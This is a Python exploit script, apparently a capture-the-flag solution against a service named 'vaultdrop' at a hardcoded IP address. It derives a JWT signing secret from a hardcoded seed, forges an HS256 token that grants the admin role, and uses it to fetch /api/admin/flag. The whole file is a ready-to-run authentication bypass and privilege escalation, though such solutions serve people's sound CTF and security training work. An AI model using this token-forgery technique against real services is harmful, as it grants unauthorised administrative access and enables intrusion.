#!/usr/bin/env python3
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import random
import string
import time

import requests

SEED_HEX = "1ec2a7b1be9e59fa7a0ff354f12ac8d3a1e646a923cbe5f84e91ac5a0b23eccf"
JWT_SUFFIX = b"vaultdrop.jwt.v2"
BASE_URL = "http://194.102.62.166:30134"
TIMEOUT = 8.0


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def derive_secret() -> str:
    seed = bytes.fromhex(SEED_HEX)
    return hashlib.sha256(seed + JWT_SUFFIX).hexdigest()


def forge_hs256(secret_hex: str, payload: dict[str, object]) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    s = b64u(hmac.new(secret_hex.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{s}"


def rand_user(prefix: str = "u") -> str:
    tail = "".join(random.choice(string.hexdigits.lower()) for _ in range(8))
    return prefix + tail


def run(base: str, timeout: float = 8.0) -> int:
    base = base.rstrip("/")
    s = requests.Session()

    health = s.get(f"{base}/api/health", timeout=timeout)
    health.raise_for_status()

    username = rand_user()
    password = "Passw0rd!123"
    reg = s.post(f"{base}/api/register", json={"username": username, "password": password}, timeout=timeout)
    # some instances may return 409 if random collision
    if reg.status_code not in (200, 201, 409):
        reg.raise_for_status()

    secret = derive_secret()
    now = int(time.time())
    token = forge_hs256(
        secret,
        {
            "sub": username,
            "role": "admin",
            "iat": now,
            "exp": now + 86400,
        },
    )

    r = s.get(
        f"{base}/api/admin/flag",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
    )

    print(f"[+] status={r.status_code}")
    print(r.text)
    return 0 if "UVT{" in r.text or "flag{" in r.text else 1


def main() -> int:
    return run(BASE_URL, timeout=TIMEOUT)


if __name__ == "__main__":
    raise SystemExit(main())
